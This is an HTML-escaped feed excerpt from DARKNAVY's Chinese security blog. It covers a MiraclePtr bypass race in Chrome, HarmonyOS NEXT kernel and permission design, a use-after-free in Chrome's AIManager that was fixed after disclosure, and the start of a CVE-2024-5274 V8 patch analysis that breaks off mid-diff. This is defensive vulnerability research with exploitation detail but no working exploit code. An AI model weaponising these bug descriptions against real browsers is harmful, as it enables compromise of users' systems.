class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;memory_order_relaxed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Check overflow.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PA_CHECK&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kPtrCountMask&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kPtrCountMask&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安全研究员Micky发现，在发生溢出后，这个CHECK并不会立即崩溃，进程处理崩溃相关的逻辑还需要一定的时间，在程序实际停止运行前，仍存在约180ms的时间（在测试环境中），这就给了攻击者生死竞速的机会，攻击者若能在这段时间内完成堆喷占位和后续控制PC等操作，则可以成功利用被MiraclePtr保护的UAF漏洞。&lt;/p&gt;
&lt;p&gt;满足攻击成功需要诸多条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;精准地溢出长度为29 bit的refcount字段。&lt;/li&gt;
&lt;li&gt;释放对象的代码与其他攻击所需的代码&lt;strong&gt;不&lt;/strong&gt;运行在同一线程，且都一定程度受攻击者控制。&lt;/li&gt;
&lt;li&gt;攻击者自由地控制目标对象的refcount。&lt;/li&gt;
&lt;li&gt;在极短的时间窗口内赢得race并完成利用。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;综合了以上种种限制，这就使得这个绕过技术几乎只存在与理论中，但Chrome团队仍慷慨地奖励了这一发现。&lt;/p&gt;
&lt;p&gt;除此之外，DARKNAVY与24年11月也发现了MiraclePtr实现上的缺陷，报告给了Chrome团队并得到了确认。&lt;/p&gt;
 &lt;img src=&#34;attachments/2bafe2a9-c149-4d72-a351-83fbd00453ad.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 60%;&#34;/&gt;
&lt;p&gt;综合这一发现以及此前多个高质量漏洞报告，DARKNAVY位列Chrome VRP 2024年度top 20安全研究员/机构。&lt;/p&gt;
 &lt;img src=&#34;attachments/0d2e3c6e-9649-482c-9c68-0041ad24cc11.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 60%;&#34;/&gt;
&lt;p&gt;了解这般背景后，不难看出，历史上仅有的绕过方式存在诸多限制，且MiraclePtr缓解机制稳定运转了两年多，时间已经检验了它的有效性，相信Google是在深思熟虑后决定的&amp;quot;无视&amp;quot;大部分UAF漏洞。&lt;/p&gt;
&lt;p&gt;Google历经两年多的时间终于基本根除了一个心头大患，这对消费者来说是可喜可贺的。在Chrome的Q3季度总结中还提到了数个对Chrome内存安全的加固，如移除C语言库libpng的依赖，改为使用Rust实现的PNG、JSON等解码；再如将图形渲染模块ANGLE移植到渲染进程中以获得更强大的沙箱保护。这方方面面的努力，无不预示着未来的Chrome将更难以使用内存破坏漏洞突破。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;深蓝洞察&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从MiraclePtr的部署到绕过案例的出现，再到其机制的不断完善，Chrome展现的不仅是技术防御的进化，更是一种安全哲学：&lt;/p&gt;
&lt;p&gt;通过奖励机制激励发现潜在问题，通过技术迭代增强整体体系，而非仅关注单点漏洞。&lt;/p&gt;
&lt;p&gt;这种模式体现了Chrome团队对&amp;quot;攻防对抗&amp;quot;的深刻认知——安全从不是一劳永逸的结果，而是一场拉锯战。&lt;/p&gt;
&lt;p&gt;随着安全研究和技术手段的同步发展，Chrome的安全或许无法做到&amp;quot;绝对防御&amp;quot;，但却可以通过这种系统化的策略，将威胁持续降低至可接受的范围，赢取用户的信任，让安全成为产品的核心竞争力。&lt;/p&gt;</description>
    </item>
    <item>
      <title>2024年度最别开生面的新生态</title>
      <link>https://www.darknavy.org/zh/darknavy_insight/the_most_groundbreaking_new_security_ecosystem_of_2024/</link>
      <pubDate>Sat, 08 Feb 2025 17:10:13 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/darknavy_insight/the_most_groundbreaking_new_security_ecosystem_of_2024/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_groundbreaking_new_security_ecosystem_of_2024/attachments/edfb09e4-2e2e-4c4f-bcd4-60f71fa4a553.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在&lt;a href=&#34;https://mp.weixin.qq.com/s/FTbvsoSwGnbPzdM1DCopoA&#34;&gt;《深蓝洞察 | 2023 年度安全报告》&lt;/a&gt;中，我们曾提到：&amp;ldquo;当我们站在下一个十年的悬崖边时，2023年注定将成为一个具有深刻转折意义的年份。新防御机制的落地和新型攻击技术的崛起，将深刻改变数字安全的格局。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;2024年，如一阵疾风而至，又如暴雨般迅速远去。我们在2023年中讨论的AI变革、移动操作系统的突破、供应链安全的挑战，已经在2024年&lt;strong&gt;继续上演&lt;/strong&gt;，几乎无法让人有片刻喘息。&lt;/p&gt;
&lt;p&gt;不断涌现的颠覆性变化，与传统安全市场如同冰窖般的低迷态势形成鲜明对比。在AI时代，&lt;strong&gt;传统的内存安全研究&lt;/strong&gt;是否仍具意义？&lt;strong&gt;新的攻击手段&lt;/strong&gt;又将走向何方？在不断变化的数字世界中，&lt;strong&gt;用户隐私的保障&lt;/strong&gt;又该如何应对？&lt;/p&gt;
&lt;p&gt;2024年的深蓝洞察，&lt;strong&gt;我们已经迎接未来的到来&lt;/strong&gt;，诚邀您一同探讨与分享。&lt;/p&gt;
&lt;p&gt;以下为本期《深蓝洞察 | 2024 年度安全报告》的第一篇。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_groundbreaking_new_security_ecosystem_of_2024/attachments/edccbbb3-c319-41dc-a2d8-aa0b007d7397.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;华&lt;/strong&gt;为于2019年发布了HarmonyOS 1.0版本，直到持续维护的HarmonyOS 4.2，虽然在应用框架层面上实现了对Android和鸿蒙的双重兼容，即所谓的&amp;quot;双框架&amp;quot;，但因为其操作系统底座仍基于Android内核，这一情况引发了业界广泛的质疑。&lt;/p&gt;
&lt;p&gt;自2024年HarmonyOS NEXT版本起，到现在发布的5.0版本，HarmonyOS应用框架层已更新为鸿蒙&amp;quot;单框架&amp;quot;，内核也已完全转向使用华为自研的HongMeng内核。正式告别了对Android应用框架、内核的依赖。&lt;/p&gt;
 &lt;img src=&#34;attachments/9ba4c168-3d16-4975-a015-ca4d4c799f74.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 60%;&#34;/&gt;
&lt;p&gt;早在6月2日，DARKNAVY就已经发布了在HarmonyOS NEXT Developer Preview2版本上完成的&lt;a href=&#34;https://mp.weixin.qq.com/s/QjXGDmnmvHyxWzoESsADLg&#34;&gt;全球第一个公开越狱视频&lt;/a&gt;，并在6月12号发布了该版本另一漏洞导致的&lt;a href=&#34;https://mp.weixin.qq.com/s/Uc21sBCfW3H3snxepNYQAw&#34;&gt;应用保活视频&lt;/a&gt;。依托获取的系统权限，我们对HarmonyOS NEXT从应用框架到内核都做了进一步的分析，研究发现无论是应用框架还是内核，HarmonyOS NEXT都与Android有着显著差异。下面我们从安全研究的角度出发，以&amp;quot;单框架&amp;quot;应用开发、权限管控、万物互联、内核架构以及系统调用几个维度为例将我们看到的真实的HarmonyOS NEXT操作系统揭示出来。&lt;/p&gt;
&lt;h2 id=&#34;鸿蒙单框架&#34;&gt;鸿蒙&amp;quot;单框架&amp;quot;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;鸿&lt;/strong&gt;蒙&amp;quot;单框架&amp;quot;意味着彻底与Android分手，系统不再支持APK安装包，也不再使用JAVA作为应用开发语言。&amp;ldquo;单框架&amp;quot;改用HAP安装包部署，应用开发语言采用eTS(extended TypeScript)。&lt;/p&gt;
&lt;p&gt;为了避免重蹈传统Android系统中恶意应用横行的覆辙，鸿蒙&amp;quot;单框架&amp;quot;着手于对原有不足的机制进行改进。例如其通过应用签名等机制限制了应用只允许从应用市场安装，杜绝任何第三方非正式应用；更为严格地限制了应用后台保活的手段，即任何后台应用10s后都会被强制挂起；采用了敏感权限单次授权，以保障授权最小化，如应用只允许获取用户单次选择的相关图片而无法直接获取所有图库图片。&lt;/p&gt;
&lt;p&gt;除了以上对原系统的优化外，鸿蒙&amp;quot;单框架&amp;quot;更有一些大刀阔斧的变革。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;ldquo;万物互联&amp;quot;的底层基石是分布式软总线(DSoftBus)，它实现了不同型号、种类的设备之间的互联互通，底层传输介质支持了WiFi、蓝牙等，协议层面覆盖了发现、鉴权、传输等不同阶段。从用户的角度，系统新增的服务如分布式文件系统、剪切板同步极大地便捷了使用。对于开发者来说，底层甚至支持远程调用其他设备的IPC，实现了分布式binder调用。在如此强大的功能下，此模块的安全性更显得尤为重要。&lt;/li&gt;
&lt;/ul&gt;
 &lt;img src=&#34;attachments/1e9908a8-a059-4c00-9952-1e5b5f58ca1b.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 50%;&#34;/&gt;
&lt;ul&gt;
&lt;li&gt;新增的XPM(eXecutable Permission Manager)模块确保了强制代码保护机制，应用仅可加载含合法签名的代码。在应用安装之后，代码文件(.abc和.so)无法被随意修改，否则将会被拒绝执行。同时还存在代码完整性保护，阻止应用篡改可执行代码。&lt;/li&gt;
&lt;li&gt;AccessToken机制实现了更细颗粒度的权限控制，它首先将token type分成Hap、Native、Shell等几个类别，分离了系统程序和APP的权限管理；一个应用的access token中包含了应用 ID、子用户 ID、应用分身索引、应用APL、授权状态等信息，有助于系统实现更为细致的鉴权。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上这几项机制都从操作系统内核层面给予了支持，实现了从上到下的全流程控制。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;值得一提的是，鸿蒙&amp;quot;单框架&amp;quot;虽不支持APK安装包，但&amp;quot;出境易&amp;rdquo;、&amp;ldquo;卓易通&amp;quot;应用使得在该系统上运行Android APP变得可能。实际分析时由于内核及TEE的加密支持，反编译这些应用市场的安装包异常困难。DARKNAVY基于前期积累实现了应用解密，使用自研反编译器，发现这些应用通过调用鸿蒙系统的容器接口实现了Android的应用和框架层模拟。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_groundbreaking_new_security_ecosystem_of_2024/attachments/041b449b-86a5-4f6f-86d6-95c83b881ba3.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;鸿蒙内核&#34;&gt;鸿蒙内核&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/darknavy_insight/the_most_groundbreaking_new_security_ecosystem_of_2024/attachments/29d2ff55-0b0c-433e-ac26-ad678551f701.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;鸿蒙内核（以下统称为HongMeng内核）基于微内核架构设计，将传统内核的各项功能拆分为一个精简的核心内核和多个独立的系统组件，并根据安全需求将部分或全部系统组件置于用户态运行，相较于Linux Kernel采用的宏内核架构，提供了更强的安全性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;在宏内核架构中，所有模块紧密耦合在一起。例如，如果攻击者利用网络模块中的漏洞成功攻破网络模块，便可直接控制整个宏内核。&lt;/li&gt;
&lt;li&gt;而在微内核架构下，即使某一模块（如网络模块）被攻破，由于各模块间的隔离机制，攻击者无法轻易将攻击扩展至其他系统模块。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
 &lt;img src=&#34;attachments/e76e86f9-bc1d-4df1-af9a-97622fb2e856.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 70%;&#34;/&gt;
&lt;p&gt;系统组件的隔离势必带来性能开销。对于组件间频繁上下文切换所带来的开销，HongMeng内核通过将文件系统管理(fsmgr)、内存管理(memmgr)、进程管理(procmgr)等频繁调用的功能移入内核态，并将网络通信、驱动(devhost)等存在较大攻击面的功能隔离于用户态，以牺牲较少量的性能换取了更高的安全性。&lt;/p&gt;</description>
    </item>
    <item>
      <title>以子之矛陷子之盾 · 用AI对AI漏洞的利用探索</title>
      <link>https://www.darknavy.org/zh/blog/chrome_x_ai_1024/</link>
      <pubDate>Thu, 31 Oct 2024 17:32:23 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/blog/chrome_x_ai_1024/</guid>
      <description>&lt;p&gt;2024年9月24日，OpenAI的CEO Sam Altman发表文章《The Intelligence Age》，大胆地宣告了AI时代的到来。&lt;/p&gt;
&lt;img src=&#34;assets/1.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 50%;&#34;/&gt;
&lt;p&gt;给予文章强有力支撑的是ChatGPT-o1的发布，这是一次里程碑式的事件，在深度学习的加成下，大模型如虎添翼，表现强劲。&lt;/p&gt;
&lt;p&gt;身处时代浪潮之中，DARKNAVY也积极拥抱AI，探索AI和安全的关系。AI能否在发现和利用漏洞时，再现人类的方法论？AI会不会带来新的安全问题？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;楚人有鬻盾与矛者，誉之曰：“吾盾之坚，物莫能陷之。”以誉其矛曰：“吾矛之利，于物无不陷也。”或曰：“以子之矛陷子之盾，何如？”其人弗能应也。夫不可陷之盾与无不陷之矛，不可同世而立。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;吾盾之坚物莫能陷&#34;&gt;吾盾之坚，物莫能陷&lt;/h2&gt;
&lt;p&gt;AI时代下，各大厂商纷纷推出了全新的AI产品、大模型，而对现存的产品，在迭代更新中，不少也加入了AI powered功能。AI已逐渐在无形之中成为了产品安全的一部分。新的代码也意味着新的攻击面，对于AI类的功能，更为特殊。&lt;/p&gt;
&lt;p&gt;新增的代码仍受到传统攻击手法的威胁，从审计的角度来看，AI代码除了功能的不同，本质上还是代码中的一个子模块，内存溢出、越界等内存破坏漏洞皆有可能存在。而除了传统的代码攻击面外，还存在着特定于AI类别的攻击面，例如模型越狱、对抗样本攻击等等。&lt;/p&gt;
&lt;p&gt;带着这样的思考，DARKNAVY的研究员将目光瞄准了Chrome的新增功能——AI Manager模块上。此&lt;a href=&#34;https://blog.google/products/chrome/google-chrome-generative-ai-features-january-2024/&#34;&gt;模块&lt;/a&gt;是Google于今年新推出的，主要用于帮助用户更快捷地写作。&lt;/p&gt;
&lt;img src=&#34;assets/2.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 45%;&#34;/&gt;
&lt;p&gt;此模块的架构和传统的Chrome模块大同小异，模块的主服务AIManagerKeyedService继承自基类KeyedService。关于这个类的生命周期，在类的声明处有&lt;a href=&#34;https://source.chromium.org/chromium/chromium/src/&amp;#43;/refs/tags/130.0.6669.0:chrome/browser/ai/ai_manager_keyed_service.h;l=25&#34;&gt;注释&lt;/a&gt;说明：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// The browser-side implementation of `blink::mojom::AIManager`. There should
// be one shared AIManagerKeyedService per BrowserContext.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当renderer试图获取此接口时，会调用到此函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AIManagerKeyedService&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AddReceiver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;mojo&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PendingReceiver&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;blink&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mojom&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AIManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;receiver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;AIContextBoundObjectSet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReceiverContext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;receivers_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;move&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;receiver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中context的类型定义为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ReceiverContext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;variant&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RenderFrameHost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SupportsUserData&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也就是说，AIManager服务中保存的context实际是来自frame的&lt;code&gt;RenderFrameHost&lt;/code&gt;对象，而此服务的生命周期和frame的生命周期并无关系。熟悉浏览器沙箱的朋友读至此，应该已经意识到了问题。若攻击者在子frame中先绑定AIManager接口，将此接口传递出去，再销毁子frame，那么此时对应接口的&lt;code&gt;RenderFrameHost&lt;/code&gt;已经被free，外部使用接口的功能将触发&lt;code&gt;RenderFrameHost&lt;/code&gt;的UAF。&lt;/p&gt;
&lt;p&gt;值得一提的是，此漏洞还是难得的不被MiraclePtr所保护的UAF漏洞:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;MiraclePtr Status: NOT PROTECTED
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;DARKNAVY发现此问题后，意识到漏洞危害极高，迅速报告并协助了Google进行修复。Google于10月15日发布新版本修复了此漏洞。&lt;/p&gt;
&lt;img src=&#34;assets/3.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 50%;&#34;/&gt;
&lt;h2 id=&#34;吾矛之利物无不陷&#34;&gt;吾矛之利，物无不陷&lt;/h2&gt;
&lt;p&gt;发现漏洞后，思路自然地转向了研究此漏洞的可利用性。正如前文所述，AI能否在此研究过程中给予人类有力的援助？AI之于安全研究员，是一把趁手的武器，还是一堆废铜烂铁？&lt;/p&gt;
&lt;p&gt;在今年GeekCon 2024&lt;a href=&#34;https://geekcon.top/&#34;&gt;新加坡站&lt;/a&gt;的舞台上，有多个有关此话题的安全研究亮相。&lt;/p&gt;
&lt;p&gt;来自清华的张超教授，展示了他们团队将大模型应用于二进制分析领域的成果，成功地应用于二进制代码相似性检测、patch补丁检测等场景；&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-5274: A Minor Flaw in V8 Parser Leading to Catastrophes</title>
      <link>https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/</link>
      <pubDate>Fri, 30 Aug 2024 10:09:29 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/blog/cve_2024_5274_a_minor_flaw_in_v8_parser_leading_to_catastrophes/</guid>
      <description>&lt;p&gt;在今年5月，我们注意到Chrome在&lt;a href=&#34;https://chromereleases.googleblog.com/2024/05/stable-channel-update-for-desktop_23.html&#34;&gt;一次更新&lt;/a&gt;中修复了一个被在野利用的V8漏洞，我们迅速定位了这个漏洞的修复，发现他是近些年来罕见的Parser模块的漏洞，这引起了我们很大的兴趣，于是有了以下的研究。&lt;/p&gt;
&lt;h2 id=&#34;从patch到poc&#34;&gt;从patch到PoC&lt;/h2&gt;
&lt;p&gt;首先我们看一下此漏洞的&lt;a href=&#34;https://chromium-review.googlesource.com/c/v8/v8/&amp;#43;/5553030&#34;&gt;patch&lt;/a&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;diff --git a/src/ast/scopes.cc b/src/ast/scopes.cc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;index 660fdd2e9ad..de4df35c0ad 100644
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;--- a/src/ast/scopes.cc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+++ b/src/ast/scopes.cc
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gu&#34;&gt;@@ -2447,7 +2447,7 @@ bool Scope::MustAllocate(Variable* var) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gu&#34;&gt;&lt;/span&gt;     var-&amp;gt;set_is_used();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     if (inner_scope_calls_eval_ &amp;amp;&amp;amp; !var-&amp;gt;is_this()) var-&amp;gt;SetMaybeAssigned();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;-  DCHECK(!var-&amp;gt;has_forced_context_allocation() || var-&amp;gt;is_used());
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+  CHECK(!var-&amp;gt;has_forced_context_allocation() || var-&amp;gt;is_used());
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;   // Global variables do not need to be allocated.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   return !var-&amp;gt;IsGlobalObjectProperty() &amp;amp;&amp;amp; var-&amp;gt;is_used();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;index 40914d39a4f..65c338f343f 100644
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;--- a/src/parsing/parser-base.h
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+++ b/src/parsing/parser-base.h
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gu&#34;&gt;@@ -2661,6 +2661,7 @@ typename ParserBase&amp;lt;Impl&amp;gt;::BlockT ParserBase&amp;lt;Impl&amp;gt;::ParseClassStaticBlock(
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gu&#34;&gt;&lt;/span&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   FunctionState initializer_state(&amp;amp;function_state_, &amp;amp;scope_, initializer_scope);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;+  FunctionParsingScope body_parsing_scope(impl());
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;   AcceptINScope accept_in(this, true);
